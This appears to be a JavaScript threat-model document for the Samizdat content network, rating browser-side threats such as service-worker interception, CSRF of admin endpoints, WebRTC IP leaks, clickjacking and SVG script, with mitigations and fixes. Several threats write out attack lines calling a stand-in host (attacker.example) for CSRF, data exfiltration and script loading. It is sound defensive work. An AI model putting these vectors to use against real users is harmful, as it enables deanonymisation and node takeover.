# JavaScript security

## How to read severities here

Severities are rated against existing defenses, not in isolation. The rubric:

- **critical**: a passive visit to a malicious series by an unprivileged user
  fully owns the node or exfiltrates secrets, with no further user action.
- **high**: same, but requires one ordinary prior action (subscribed to a
  series, clicked a link from a friend), or breaks isolation between two
  entities the user actively uses.
- **medium**: requires the user to have explicitly granted the malicious entity
  a sensitive right (e.g. `ManageSeries` via `/_register`), OR is a privacy/
  fingerprinting attack with bounded yield, OR is a defense-in-depth gap
  rather than a missing primary defense.
- **low**: requires multiple coordinated user actions, OR is preempted by an
  existing mitigation in all but corner cases, OR a covert-channel/timing
  attack with low practical yield.

A threat rated "medium" still matters: it is gated by an existing defense
today and would become critical if that defense regressed. The Mitigation in
place bullet under each threat names the specific defense it depends on.

## Scope and threat model

The adversary modelled here is state-level (NSA-class): well-resourced, willing
to publish content into the Samizdat network for the specific purpose of
running JavaScript inside a target user's browser, willing to host attacker-
controlled origins outside the network (`attacker.example`) and to time-
correlate observations across the public internet. The goal of the adversary
is one of: deanonymise the user, exfiltrate the node's secrets (admin token,
series private keys, identity material), or take over the local node by
issuing admin operations that look like the user issued them.

This document catalogues the JavaScript-layer attack surface only. The non-JS
boundaries (proxy stripping headers, `deny_outside_requests`, QUIC riddles,
hub federation reflection, build-script symlink refusal) are covered in
`docs/threat-model.md` and are not restated here.

The honest framing: the browser is the surface with the FEWEST
defense-in-depth headers today. No CSP, no `X-Content-Type-Options: nosniff`,
no `frame-ancestors`, no COOP/COEP, no `Permissions-Policy`. The primary
defenses ARE in place per `docs/threat-model.md`: `deny_outside_requests` is
the outer cordon (loopback is explicitly the OUTER boundary, not "trusted"),
browser pages are handled separately via Referer-based trusted context, and
CORS preflight blocks non-simple cross-origin requests (any `Authorization`
header, any `application/json` body). The proxy strips `Authorization` and
`Referer` so proxy-routed requests resolve as `entity = None` with
`granted = [Public]`. What is missing is the second-layer hardening: header-
level mitigations against fingerprinting, clickjacking, MIME confusion, and
the structural single-origin lumping that web platform contracts care about.

## The single-origin problem

The historical shape: every series, every identity, every page served by
the node lived at one origin (`http://127.0.0.1:4510`), with the proxy
mirroring the lumping under `https://proxy.hubfederation.com/...`.
Inside one origin, web platform contracts treat the contents as one
application. The typed-subdomain dispatcher closes this on both
surfaces: each entity gets its own subdomain origin, and the storage,
service-worker, cookie, and same-origin partitioning that the web
platform provides per-origin now lines up with the access-control model
Samizdat has in mind. T1, T9, T10, T15 below are the residual write-ups
of the closed surface; the structural analysis is kept for context.

Inside one origin, web platform contracts treat the contents as one
application. Concretely, every Samizdat-served page sees the same:

- `localStorage`, `sessionStorage`
- `IndexedDB`
- `Cache Storage` (the `caches` global) and the HTTP cache
- cookies (none set today, but the contract is there)
- service workers, including their scope rules and `Clients.matchAll`
- `BroadcastChannel`, `SharedWorker`, `MessageChannel`
- `window.open` / `window.opener` / `postMessage` between same-origin frames

So a malicious page served at `/~attacker/` can read storage that a
legitimate page at `/~bank/` wrote, can install a service worker that
intercepts requests for `/~bank/`, can open a `BroadcastChannel` that any
other Samizdat page listens on, and can `fetch` any sibling entity's
resources without a cross-origin barrier. The path-based "entity" the auth
layer extracts from the `Referer` is an authorization concept; it is *not*
a same-origin policy.

The typed-subdomain dispatcher lands that boundary: each entity is
served at its own subdomain (`series-<key>.<root>`, `<identity>.<root>`,
etc.) on both the node and the proxy. Browsers treat each subdomain as
a separate origin for storage, service workers, cookies, and CORS, so
the access-control model the auth layer always assumed now matches the
web platform's contract.

## Threats

### T1. Service worker survives series uninstall and intercepts other series
**Vector** -- Malicious series content registers a service worker via
`navigator.serviceWorker.register('/sw.js')`. Before per-series subdomain
isolation, the worker registered at origin scope `http://localhost:4510/`
intercepted every other Samizdat-served path on that origin.
**Current state** -- Largely resolved. Each series is served at
`<base32-key>.localhost:<port>` (its own browser origin), so a service
worker registered by series A is scoped to series A only and never sees
fetches for series B. The dispatcher in `node/src/http/host_scope.rs` is
the structural fix.
**What an attacker gets** -- Persistent man-in-the-middle for THAT
series' own pages, until the user unregisters the worker. No cross-series
reach.
**Severity** -- low. Reduced from high once the per-series origin
boundary landed; only same-series MITM remains, and that is the operator
controlling their own series.
**Mitigation in place** -- per-series origin isolation
(`node/src/http/host_scope.rs` + the host-based content router in
`node/src/http/mod.rs`); admin endpoints live on a different origin
(bare loopback) so the worker cannot reach them even with CORS open
unless an explicit ManageSeries grant exists for that entity.
**Closed hierarchy-wide** by the typed-subdomain refactor: the proxy
now speaks the same prefix-label dispatch as the node, so each entity
has its own browser origin on both surfaces.
**Fix** -- none required.

### T2. Page on samizdat-served origin reads admin/read tokens via fetch
**Vector** -- A page on a series subdomain calls `fetch('/_register?
right=ManageSeries', ...)` and, after the user clicks through, reads
`/_series-owners` to obtain every series owner's private key bytes.
**Current state** -- This is the OAuth-style scope-and-consent model
working as designed. `ManageSeries` is a capability scope; granting it
authorizes the entity to manage all locally-owned series, exactly as the
consent screen states at `node/templates/register.html:24-26` ("Read your
locally owned series' private keys (full impersonation on the network)
and sign new editions on your behalf"). It is not a per-resource ACL;
the threat is not the scope's shape, but the user granting it to the
wrong entity via UI deception.
**What an attacker gets** -- Whatever scope the user clicked Allow on.
For `ManageSeries`, full impersonation of every locally-owned series.
**Severity** -- low. The flow REQUIRES the user to navigate through
`/_register`, read the consent text, wait through the 3-second delay
gate, and click Allow. The catalogued residual is the consent-UI
deception path (see T13), not the scope model.
**Mitigation in place** -- The OAuth-style scope-and-consent flow itself;
`docs/threat-model.md` "Browser pages served by the node". The consent
text was sharpened for `ManageSeries`, `ManageIdentities`, and
`ManageHubs` and a 3-second delay-then-enable gate added to the Allow
button (`node/templates/register.html`).
**Fix** -- None. T2 is the intended design. Residual risk lives in T13.

### T3. Off-origin page CSRFs `/_*` admin endpoints
**Vector** -- A page on `https://attacker.example` issues `fetch(
'http://127.0.0.1:4510/_vacuum/flush-all', { method: 'POST',
mode: 'no-cors', body: 'x', headers: {'Content-Type': 'text/plain'} })`.
This is a CORS-simple request, no preflight; the browser sends it.
The node receives it, sees a loopback peer (the user's browser),
`deny_outside_requests` passes.
**Current state** -- `node/src/http/mod.rs:179-196` gates `/_vacuum/*`
with `authenticate_trusted_context` which requires either a `Referer`
matching `/_register` OR a bearer token. A cross-origin `fetch` from
`https://attacker.example` will include `Referer:
https://attacker.example/...` (default `Referrer-Policy` for same-origin
navigations is `strict-origin-when-cross-origin`); `check_origin` at
`node/src/http/auth.rs:180-195` rejects non-loopback origins, so the
request is refused. Good. But that defence depends on the `Referer`
being sent at all: a page using `Referrer-Policy: no-referrer` will
strip it, and `entity_from_referrer` returns `MissingReferer`. For
`authenticate_trusted_context` this denies (good); for any route that
treats missing `Referer` as `entity = None` and grants `Public`-rights
access (most read routes via `do_authenticate_security_scope`), the
request passes. That is the surface: any future write route that opts
into `read; AccessRight::Public` is silently CSRF-able cross-origin.
**What an attacker gets** -- Today, very little (the gated routes are
guarded; vacuum is closed). Tomorrow, whatever new write route someone
adds with `Public` rights becomes a cross-origin CSRF target.
**Severity** -- low: CORS preflight blocks the dangerous shape (any
`Authorization` header or `application/json` body triggers preflight); the
remaining surface is "simple POST with `text/plain`", and the only
catalogued route in that shape that mutates state (`/_vacuum/*`) is gated
with `authenticate_trusted_context`. The risk is regression on a new
route, not a present-day bug.
**Mitigation in place** -- CORS preflight at the browser layer plus
`authenticate_trusted_context` on `/_vacuum/*`; see `docs/threat-model.md`
"Browser pages served by the node" and "A malicious local web page in the
user's browser". This audit pass did not exhaustively enumerate every
simple-POST route in `node/src/http/`; a route that accepts simple POST
without `authenticate_trusted_context` would re-introduce the surface.
**Fix** -- Add an origin/Host check to every state-mutating route, not
just `_vacuum`. Centralise it in `deny_outside_requests` so that POST,
PUT, PATCH, DELETE without a `Referer`-matching-loopback OR a bearer
token are rejected unconditionally. Document the rule in `auth.rs`
module-doc.

### T4. Browser-side fingerprinting and phone-home
**Vector** -- Published series content runs canvas/audio/WebGL/font
enumeration, hashes the result, and POSTs to
`https://attacker.example/collect`. The attacker correlates the hash
across sessions, devices, identities.
**Current state** -- No CSP at all. `node/src/http/resolvers.rs:26-39`
serves objects with `Content-Type` and Samizdat-prefixed metadata; no
`Content-Security-Policy`, no `connect-src`, no `script-src`.
**What an attacker gets** -- Stable cross-session identifier of the
user. Combined with the public IP visible to `attacker.example`, this
deanonymises the user even if they only ever view content "anonymously"
through Samizdat.
**Severity** -- high: passive deanonymisation by visiting a malicious
series the user has subscribed to or been linked into.
**Mitigation in place** -- none at the header layer; this is an unmitigated
gap. The threat model does not claim browser fingerprinting is bounded by
any existing primitive, and there is no CSP today (see "Defensive
primitives to add" below).
**Fix** -- Emit a strict CSP from the resolver. See "Defensive primitives".
The relevant code is `node/src/http/resolvers.rs:68` (new objects) and
`node/src/http/resolvers.rs:97` (existing objects); both build
`Resolved` with `ext_headers`. Add CSP to both. Apply consistently in a
shared helper so the headers cannot drift.

### T5. WebRTC LAN/public-IP leak
**Vector** -- A page calls
`new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})`,
creates a data channel, and reads `icecandidate` events. The browser
emits host candidates (LAN IPs and hostnames) and server-reflexive
candidates (public IP via STUN), bypassing every browser-level "do not
phone home" intent the user has.
**Current state** -- No `Permissions-Policy` on responses. I could not
locate a relevant header anywhere in `node/src/http/`.
**What an attacker gets** -- LAN topology, public IP. With a VPN this is
the VPN exit. Without, this is the user's home IP. Either way
deanonymising.
**Severity** -- high: requires the user to have navigated to (or
subscribed to) the malicious series, but once visited the deanonymisation
is passive and complete against a state-level adversary.
**Mitigation in place** -- none; no `Permissions-Policy` and no CSP today.
This is an unmitigated gap at the header layer.
**Fix** -- Emit `Permissions-Policy: ... camera=(), microphone=(),
geolocation=(), gyroscope=(), payment=()` plus the CSP `connect-src
'self'` (which alone blocks STUN/TURN to non-self). Browsers vary in
how aggressively they enforce `connect-src` over WebRTC; the
defence-in-depth answer is also a feature policy that disables WebRTC
entirely for non-trusted entities. Apply in
`node/src/http/resolvers.rs` as above.

### T6. Clickjacking via iframe embed
**Vector** -- `attacker.example` embeds
`<iframe src="http://127.0.0.1:4510/~bank/transfer"></iframe>` and
overlays UI to trick the user into clicking through. The samizdat-
served page renders with no framing restriction.
**Current state** -- No `X-Frame-Options`, no CSP `frame-ancestors`.
Not present in `node/src/http/resolvers.rs`, not present in any
middleware in `node/src/http/mod.rs`.
**What an attacker gets** -- UI redress on any samizdat-served page
that takes a user action (a click, a form submit, a popup open). On the
node side, the request looks like a same-origin click from the
samizdat-served page, so trusted-context checks pass.
**Severity** -- high: amplifies T2 (a "click to authorize" can be
clickjacked into "ManageSeries granted"); requires the user to visit
`attacker.example` first.
**Mitigation in place** -- none at the header layer; no `X-Frame-Options`
and no `frame-ancestors`. This is an unmitigated defense-in-depth gap.
The Referer-trusted-context check still gates `/_register` so the
clickjacked click must traverse the legitimate grant UI; that UI is the
only line of defense today.
**Fix** -- Emit `X-Frame-Options: DENY` (legacy) and CSP
`frame-ancestors 'none'` from every response. Same site:
`node/src/http/resolvers.rs:26` for objects, plus a global response
middleware in `node/src/http/mod.rs:225` covering API responses.

### T7. MIME sniffing
**Vector** -- Attacker uploads content with `Content-Type: text/plain`
but body that browsers historically sniff as HTML or JS. Without
`X-Content-Type-Options: nosniff`, the response is executed as HTML.
**Current state** -- `node/src/http/resolvers.rs:28` and `:50` set
`Content-Type` only. No `nosniff` header. `ObjectHeader::new` accepts
any content type the publisher named.
**What an attacker gets** -- Active content (HTML/JS) under any URL
where the publisher claimed it was inert (text, image, etc.). Critical
when the storing entity is trusted by the victim but the *content* came
from a third party (re-upload, mirror, subscription).
**Severity** -- medium: requires the user to navigate to a malicious
object on a series they have already engaged with; the practical impact is
HTML/JS execution under the samizdat origin, which is then bounded by the
existing Referer-trusted-context grant model.
**Mitigation in place** -- none at the header layer; no `nosniff`. This is
an unmitigated defense-in-depth gap. The same-origin contract still
applies, so any execution is bounded by the entity's existing rights.
**Fix** -- Add `X-Content-Type-Options: nosniff` in the same
`Resolved::into_response` path. One line.

### T8. SVG with embedded `<script>`
**Vector** -- Publish an object with `Content-Type: image/svg+xml` that
contains `<script>` inside the SVG. The browser, when navigating to the
SVG URL or `<embed>`ing/`<iframe>`ing it, executes the script in the
SVG's origin (which is the samizdat origin).
**Current state** -- No content rewriting. `node/src/http/resolvers.rs`
streams object bytes as-is.
**What an attacker gets** -- Script execution under the samizdat
origin from a "harmless image". Pivots into T13 (consent-UI deception)
or T4 (fingerprinting).
**Severity** -- medium: requires the user to navigate to the SVG URL or
to a page that embeds it, on a series they have engaged with. The
escalation paths (T2, T4) are themselves gated by Referer-trusted-context
and by the absence of CSP respectively.
**Mitigation in place** -- none specific to SVG; relies on the same
Referer-trusted-context boundary as T2 for admin escalation.
**Fix** -- Serve `image/svg+xml` with CSP `script-src 'none'` (the same
CSP from T4 already does this if `script-src 'self'` and the SVG is
inline-`<script>`-only; SVG embedded script is treated as inline). Or,
content-type-rewrite: serve any svg to `image/svg+xml; charset=utf-8`
and additionally `Content-Disposition: attachment` so navigation
downloads rather than renders. The cleanest fix is to refuse to render
SVG inline; serve as `application/octet-stream` for objects without an
allowlisted MIME.

### T9. Cross-series JS pull
**Vector** -- A page on series A includes
`<script src="http://<base32-other-key>.localhost:4510/sensitive.js">`.
The script is on a different origin; the browser fetches it as a normal
cross-origin script and executes in series A's context (script tags are
opaque cross-origin reads by design of the web platform).
**Current state** -- Structurally bounded: the fetch crosses origins now
that each series has its own subdomain, so the browser can no longer
pretend the source was "same-site". A page that loads a sibling series'
script gets opaque execution; no DOM access, no body read via JS, no
cookies sent.
**What an attacker gets** -- Execution of the foreign script body in the
attacker entity's context. The script body itself is not readable from JS
unless the foreign series cooperates with CORS (which it does not by
default). What leaks: the side effects of executing the script, if any.
**Severity** -- low. Reduced from medium once per-series subdomain
isolation landed; the attack is now no different from any cross-origin
`<script src>` on the open web.
**Mitigation in place** -- per-series origin isolation
(`node/src/http/host_scope.rs`). Foreign scripts run opaque; no
cross-series cookie or storage reach.
**Closed hierarchy-wide** by the typed-subdomain refactor: the proxy
serves each series at its own subdomain, so a sibling series' script is
cross-origin on the proxy as well.
**Fix** -- none required.

### T10. Cache and Cache-Storage as persistent fingerprint
**Vector** -- A page writes an entry to `caches.open('attacker').then(
c => c.put('/marker', new Response('uuid')))`. Next session, the same
page reads the marker.
**Current state** -- Per-series subdomain isolation scopes Cache Storage
and the HTTP cache to one series. Cross-series tracking via this oracle
is closed. WITHIN a series, the operator still has a long-lived
identifier; that is intrinsic to letting authors run JS on their own
content.
**What an attacker gets** -- A per-series-per-browser identifier. No
cross-series correlation via this surface.
**Severity** -- low. Reduced from medium once per-series origin
isolation landed.
**Mitigation in place** -- per-series origin isolation; cache and
storage are partitioned per browser-origin.
**Closed hierarchy-wide** by the typed-subdomain refactor: the proxy
partitions cache and storage per entity too.
**Fix** -- none required.

### T11. Persistent supply-chain via external `<script src=https://...>`
**Vector** -- A subscribed series ships a page with
`<script src="https://cdn.attacker.example/lib.js"></script>`. Every
time the user visits, the browser fetches from
`cdn.attacker.example`, leaking the user's IP and a load-pattern that
identifies which Samizdat content they are reading. The script runs in
the samizdat origin and can pivot into T13 (consent-UI deception) or
T4 (fingerprinting + phone-home).
**Current state** -- No content-ingest validation. `node/src/models/`
accepts arbitrary HTML. The proxy at `proxy/src/http.rs:107-109`
rewrites HTML through `proxy_page` but the rewrite does not look at
`<script src>`.
**Severity** -- high: requires the user to have subscribed to (or
otherwise visited) the malicious series first, but once subscribed the
backdoor persists across visits and runs in the samizdat origin with
whatever rights that entity has been granted.
**Mitigation in place** -- none at the ingest layer or the serve layer
(no CSP today). The Referer-trusted-context check still bounds the
external script's reach into admin endpoints to the entity's existing
rights, so without a prior `/_register` grant the damage is fingerprinting
+ content-impersonation rather than admin takeover.
**Fix** -- Two layers. At ingest, refuse to commit HTML containing
external `<script src>`, external `<link rel=stylesheet>`, or external
`<iframe>` (warn user, require an opt-in flag). At serve, the CSP
`script-src 'self'; connect-src 'self'; style-src 'self'` enforces it
regardless of what ingestion missed. Belt and braces; this surface is
too sharp for either alone.

### T12. crossOriginIsolated / SharedArrayBuffer / Spectre
**Vector** -- If COOP and COEP are absent (status quo), the page is
not cross-origin-isolated, so `SharedArrayBuffer` is unavailable and
Spectre-style attacks across origins are impractical for now. If a
future change accidentally enables them (e.g. `Cross-Origin-Opener-
Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`),
SAB becomes available and a malicious page can run Spectre primitives
to read memory across origins.
**Current state** -- COOP/COEP absent. Confirmed: no occurrence in
`node/src/http/` headers.
**What an attacker gets** -- Today: nothing (status quo blocks SAB).
After an accidental enabling: cross-process memory disclosure.
**Severity** -- low today, high if the headers get enabled without the
rest of the isolation contract.
**Mitigation in place** -- the absence of COOP/COEP is itself the
mitigation: without `crossOriginIsolated`, `SharedArrayBuffer` is
unavailable. This is a regression-guard concern, not a present-day bug.
**Fix** -- Document the dependency in `node/src/http/mod.rs` and add a
test that asserts COOP/COEP combination is either both off or both on
together with `Cross-Origin-Resource-Policy: same-origin`. If future
work needs SAB (e.g. WASM threading for content rendering), do the full
isolation contract; otherwise keep them off.

### T13. UI deception in the `/_register` grant flow
**Vector** -- The Referer-based trusted-context model assumes the user
understands what `/_register` grants when they click through. A malicious
page on the samizdat origin can manipulate the surrounding UI (overlay,
distract, race, or simply present misleading copy) to coax the user into
completing a `/_register` flow that grants `ManageSeries` or another
sensitive right to an entity the user did not mean to trust. The page
cannot forge the grant itself (the popup is served by the node and shows
the requesting entity), but it can shape the user's expectation around
the click.
**Current state** -- `deny_outside_requests`
(`node/src/http/mod.rs:208-221`) is the outer cordon, explicitly the
loopback boundary and NOT a trust assertion (see `docs/threat-model.md`
"Trust boundaries at a glance" and "What is authenticated, and what
isn't"). Browser pages are handled as a separate boundary via Referer-
based trusted context plus CORS preflight. The remaining surface is the
trustworthiness of the `/_register` UI itself: the user is the one
asserting that the requesting entity should hold the right.
**What an attacker gets** -- Whatever right the user can be convinced to
grant. Today, that includes `ManageSeries` (flat across entities; see
T2), which is the high-impact pivot.
**Severity** -- medium. With T2 demoted to "intended design", T13 is the
load-bearing residual risk for scope grants. Not critical (it requires
an explicit user click through `/_register`), but the consent screen IS
the entire defense once an entity has talked the user into the popup.
**Mitigation in place** -- Referer-based trusted context and CORS
preflight (see `docs/threat-model.md` "Browser pages served by the
node"); the `/_register` popup is served by the node and names the
requesting entity. The consent text was sharpened for the three
high-impact rights (`ManageSeries`, `ManageIdentities`, `ManageHubs`) to
state the consequence plainly, and a 3-second delay-then-enable gate
sits on the Allow button so the user cannot muscle-click through
(`node/templates/register.html`).
**Fix** -- Further consent-UI hardening: distinguish series-keyed
entities from identity-keyed entities visually, surface prior-grant
history (has the user interacted with this entity before), and consider
typed-confirmation on the three high-impact rights. No scope-model
change.

### T14. Proxy origin vs local origin: header asymmetry
**Vector** -- The same content is served at two origins:
`http://127.0.0.1:4510` (local) and
`https://proxy.hubfederation.com` (via `proxy/src/http.rs`). Security
headers added on the node path are not necessarily forwarded by the
proxy, and vice versa.
**Current state** -- `proxy/src/http.rs:13-22` lists `PROXY_HEADERS`
that get forwarded: `ETag`, `X-Samizdat-Bookmark`, `X-Samizdat-Object`,
`X-Samizdat-Is-Draft`, `X-Samizdat-Collection`, `X-Samizdat-Series`,
`X-Samizdat-Edition`, `X-Samizdat-Query-Duration`. **No security
headers** (CSP, X-Frame-Options, X-Content-Type-Options, COOP, COEP,
Permissions-Policy, Referrer-Policy) appear in this list. If the node
ever starts emitting them they will be silently stripped by the proxy.
The proxy DOES add `Content-Type` (`proxy/src/http.rs:91-93`) but
nothing else.
**What an attacker gets** -- A way to bypass node-side hardening by
asking the user to visit the proxy URL instead of the local one.
**Severity** -- medium: defense-in-depth gap rather than a missing primary
defense; today no node-side headers exist for the proxy to strip, so the
asymmetry has no present-day yield. Becomes high the moment node-side
headers are added without updating the proxy allowlist.
**Mitigation in place** -- partial; the proxy's input-side hardening
(strips `Authorization`, strips `Referer`, GET only) per
`docs/threat-model.md` "Proxy" still bounds what a proxy-routed page can
trigger admin-wise: every proxy-forwarded request resolves as
`granted = [Public]`. The response-side header asymmetry is the
unmitigated piece.
**Fix** -- Extend `PROXY_HEADERS` to include every security header.
Better: when the proxy injects its own `proxy_page` rewrite
(`proxy/src/http.rs:109`), inject the same security headers
authoritatively so the proxy origin is hardened *independently* of what
the node sent. The per-entity origin split at the proxy
(typed-subdomain refactor) removes the single-origin lumping that made
T1/T9/T10/T15 worse on the proxy surface; the header-forwarding gap is
the remaining piece of T14.

### T15. Identity vs path confusion
**Vector** -- The address bar shows `~bank.example/login` while the
content rendered is from a different identity (or from a path in a
different entity). Could JS make this happen?
**Current state** -- `IdentityRef::from_str`
(`node/src/http/identities.rs:31-44`) rejects empty, `~`, `.`, `..`,
and underscore-prefixed handles. `resolve_identity`
(`node/src/http/resolvers.rs:304-320`) resolves the handle to a series
and serves a collection item from that series's freshest edition. A
malicious identity owner CAN serve any content they like under their
own handle; they cannot make the address bar show a *different*
identity's name without `history.pushState` / `replaceState` -- and
those are constrained by the same-origin policy to URLs on the same
origin. Within one origin (the single-origin problem), the attacker can
manipulate the path part of the URL freely to read `~bank.example/...`
in the address bar even while serving content that points to other
entities. The browser's address bar will reflect `pushState`'s URL but
the *origin* is still `127.0.0.1:4510`.
**What an attacker gets** -- UI deception: the user sees
`http://127.0.0.1:4510/~bank.example/login` while the page itself was
loaded from `/~attacker/`. Combined with T9 (cross-series JS pull), the
attacker can render a convincing forgery.
**Severity** -- low. Per-series subdomain isolation closes
`pushState`-across-entities (the address bar shows the actual subdomain
host, and `pushState` to a different origin is blocked). Residual
deception is the operator's own URL-bar manipulation within their own
subdomain, which is what any web author can do on any website.
**Mitigation in place** -- per-series origin isolation
(`node/src/http/host_scope.rs`). `pushState` to a different
`series-<key>.<root>` or `<identity>.<root>` is a cross-origin operation
that the browser refuses.
**Closed hierarchy-wide** by the typed-subdomain refactor: the proxy
also gives each entity its own subdomain, so cross-entity `pushState`
is cross-origin on the proxy as well. Phishing-styled identities are
rejected at registration and at runtime by
`samizdat_common::identity::check_servable_identity`.
**Fix** -- none required.

### T16. Proxy template writes a shared cross-series localStorage key
**Vector** -- `proxy/templates/proxied-page.html.jinja:146-159` writes the
integer counter `__samizdat_proxy_page_count` into `localStorage`.
Because every series viewed through `proxy.hubfederation.com` shares one
browser origin, that key is readable and writable by any series an
attacker controls.
**Current state** -- The counter exists to drive a donation modal every
N page views; it was not intended as a cross-series surface.
**What an attacker gets** -- A trivial shared identifier readable across
series viewed via the proxy. A malicious series can overwrite the
counter, read prior values, or use the key as a side-channel beacon.
**Severity** -- low. Bounded yield (one integer per browser profile).
The typed-subdomain refactor partitions `localStorage` per entity on
the proxy too, so this counter now lives in a per-entity origin; the
shared-key issue collapses to "every viewer of THIS series, this
browser profile". Audit the template before relying on the new scoping.
**Mitigation in place** -- none.
**Fix** -- Move the counter into a sessionStorage entry namespaced by
the request's entity, or drop the modal trigger entirely.

### T17. Proxy template leaks viewer IP to Google Fonts on every view
**Vector** -- The proxy page template at
`proxy/templates/proxied-page.html.jinja` unconditionally embeds Google
Fonts via `fonts.googleapis.com` and `fonts.gstatic.com`. Every viewer
of any proxied page sends one or more requests to Google with the
viewer's IP and `Referer` shape revealing they are reading samizdat
content through the public proxy.
**Current state** -- The references are in the proxy template chain;
the audit could not exhaustively confirm they are the only third-party
references. The reader should grep before relying on the absence.
**What an attacker gets** -- (Passive Google) Per-viewer IP correlation
tying the viewer to samizdat-via-proxy usage and to specific page views.
**Severity** -- medium. Affects every proxy viewer, every page view, by
default. No user action required.
**Mitigation in place** -- none.
**Fix** -- Self-host the fonts inside the proxy origin or drop the
custom font from the template.

## Defensive primitives to add

Already shipped (in `node/src/http/mod.rs::api`):
- `X-Content-Type-Options: nosniff` globally.
- `X-Frame-Options: DENY` on the admin sub-router.
- `Referrer-Policy: same-origin` globally (authors override per-document
  via `<meta name="referrer">` or per-element via `referrerpolicy`).
- `Permissions-Policy: interest-cohort=()` globally.
- `Content-Security-Policy: default-src 'none'; script-src 'self'
  'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self';
  img-src 'self' data:; form-action 'self'; frame-ancestors 'none';
  base-uri 'none'` on the admin sub-router only. The content origin
  carries no platform-imposed CSP; authors who want one ship a
  `<meta http-equiv="Content-Security-Policy">` in their `<head>`.
- The four security headers above are now forwarded by
  `proxy/src/http.rs::PROXY_HEADERS`.

Still open:
- `Cross-Origin-Opener-Policy: same-origin` and
  `Cross-Origin-Embedder-Policy: require-corp` -- closing T12. Decision
  shaped: enabling both opts into `crossOriginIsolated`, which unlocks
  SharedArrayBuffer and high-precision timers, which in turn admits
  Spectre-class attacks. Today both are absent and SAB is unavailable.
  Keep them absent until SAB is needed.
- `Cross-Origin-Resource-Policy: same-origin` on content responses.
  Prevents arbitrary origins from embedding samizdat-served resources
  via `<img>`/`<script>`/`<link>`. Cross-check with whatever the proxy
  needs to fetch.
- A content-side CSP IS NOT on this list by deliberate decision:
  samizdat does not police what authors put on their pages. Authors
  who want a strict policy on their own series add a `<meta>` tag.

## Items already covered elsewhere

- The bearer-token / Referer dual auth model is laid out in
  `docs/threat-model.md` under "What is authenticated, and what
  isn't"; not restated here.
- The OAuth-style scope-and-consent model (rights are scopes granted
  per-entity via `/_register`, not per-resource ACLs) is described in
  `docs/threat-model.md` "Browser pages served by the node".
  Consent-screen hardening is the meaningful follow-up; per-entity
  scope narrowing is not a fix because it would break legitimate
  Samizdat admin-tool web apps.
- The proxy's GET-only / strip-Authorization / strip-Referer behaviour
  is in `docs/threat-model.md` under "Proxy". The remaining proxy-side
  divergence from local browsing (HTTPS termination, donation-modal
  template, Google Fonts) is catalogued in
  `docs/proxy-app-divergence.md`.
- The hub-federation reflection primitive is `threat-model.md`'s "A
  peer node deep in the federation graph"; out of scope here.

## Open questions for Pedro

- Should the consent screen distinguish series-keyed entities
  (`_series/<base64-key>`) from identity-keyed entities
  (`_identity/~<handle>`) more visibly? Is prior-grant history a useful
  signal? Is typed-confirmation acceptable on the three high-impact
  rights even though it slows down legitimate admin-tool installs?
- Drop the donation modal counter (T16) from the proxy template, or
  scope it per-entity?
- Self-host the proxy template's fonts (T17), or accept the
  third-party leak as the cost of nice typography?
